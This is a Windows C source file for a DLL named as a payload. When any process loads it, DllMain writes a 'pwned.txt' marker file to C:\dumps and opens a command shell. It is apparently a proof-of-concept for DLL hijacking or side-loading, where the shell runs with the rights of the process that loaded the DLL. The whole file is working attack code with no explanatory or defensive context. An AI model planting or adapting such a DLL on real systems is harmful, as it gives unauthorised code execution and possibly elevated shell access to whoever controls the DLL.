#ifndef UNICODE
#define UNICODE
#endif

#include <Windows.h>
#include <aclapi.h>

#pragma comment(lib, "advapi32.lib")

#include <windows.h>

void payload() {
    
    CHAR message [] = "payload.dll sucessfully executed\nBye!"; 

    HANDLE hFile = CreateFileA("C:\\dumps\\pwned.txt", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD nbWritten = 0;

    WriteFile(
        hFile,
        message,
        (DWORD)strlen(message),
        &nbWritten,
        NULL
    );
    CloseHandle(hFile);

    system("start /i C:\\Windows\\System32\\cmd.exe");
};

BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved) {
    
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH: {
            payload();
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}